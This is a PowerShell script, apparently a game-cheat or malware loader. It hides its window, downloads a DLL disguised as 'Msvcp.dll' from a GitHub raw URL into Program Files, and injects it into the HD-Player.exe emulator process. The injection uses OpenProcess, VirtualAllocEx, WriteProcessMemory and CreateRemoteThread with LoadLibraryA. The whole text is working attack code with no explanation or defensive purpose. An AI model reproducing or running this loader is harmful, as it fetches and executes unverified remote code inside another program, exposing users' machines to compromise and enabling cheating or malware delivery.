
powershell -WindowStyle Hidden -Command "Start-Process cmd -ArgumentList '/c your_command_here' -WindowStyle Hidden"

# URL of the DLL to download
$dllUrl = "https://github.com/prantikba03-gif/ngcgfx/raw/refs/heads/main/Msvcp.dll"
# Local path to save the DLL
$dllPath = "C:\Program Files (x86)\Msvcp.dll"

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath

# Path to DLL you want to inject
$dllPath = "C:\Program Files (x86)\Msvcp.dll"

# Get process ID of HD-Player
$process = Get-Process -Name "HD-Player" -ErrorAction SilentlyContinue
if (-not $process) {
    Write-Host "HD-Player.exe not found!"
    exit
}
$pid = $process.Id

# Win32 API functions
Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern System.IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern System.IntPtr VirtualAllocEx(System.IntPtr hProcess, System.IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(System.IntPtr hProcess, System.IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern System.IntPtr GetProcAddress(System.IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern System.IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern System.IntPtr CreateRemoteThread(System.IntPtr hProcess,
        System.IntPtr lpThreadAttributes, uint dwStackSize, System.IntPtr lpStartAddress,
        System.IntPtr lpParameter, uint dwCreationFlags, System.IntPtr lpThreadId);
"@ -Namespace "Win32" -Name "NativeMethods"

# Constants
$PROCESS_ALL_ACCESS = 0x1F0FFF
$MEM_COMMIT = 0x1000
$PAGE_READWRITE = 0x04

# Open target process
$hProcess = [Win32.NativeMethods]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)

# Allocate memory for DLL path
$bytes = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
$allocMem = [Win32.NativeMethods]::VirtualAllocEx($hProcess, [IntPtr]::Zero,
    [uint32]$bytes.Length, $MEM_COMMIT, $PAGE_READWRITE)

# Write DLL path to target process memory
[void][Win32.NativeMethods]::WriteProcessMemory($hProcess, $allocMem, $bytes, [uint32]$bytes.Length, [ref]0)

# Get address of LoadLibraryA
$loadLibraryAddr = [Win32.NativeMethods]::GetProcAddress(
    [Win32.NativeMethods]::GetModuleHandle("kernel32.dll"), "LoadLibraryA")

# Create remote thread to load DLL
[void][Win32.NativeMethods]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibraryAddr, $allocMem, 0, [IntPtr]::Zero)

Write-Host "DLL injected into HD-Player.exe"